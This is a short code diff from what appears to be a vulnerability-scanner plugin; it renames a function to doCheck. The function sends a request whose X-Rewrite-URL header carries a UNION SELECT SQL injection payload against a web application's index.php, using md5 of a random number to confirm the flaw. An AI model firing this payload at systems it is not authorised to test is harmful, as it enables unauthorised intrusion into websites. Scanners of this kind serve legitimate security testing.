@@ -11,7 +11,7 @@ def randomInt(s,e):
 	key=random.randint(int(s),int(e))
 	return key
 r2=randomInt(40000, 44800)
-def scan(baseurl):
+def doCheck(baseurl):
 	url=baseurl+"/index.php?lang=Cn&index=1"
 	headers={'X-Rewrite-URL': "1/2/404xxx' union select md5("+str(r1)+"),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php"}
 	response=requests.get(url,headers=headers,timeout=5,verify=False)
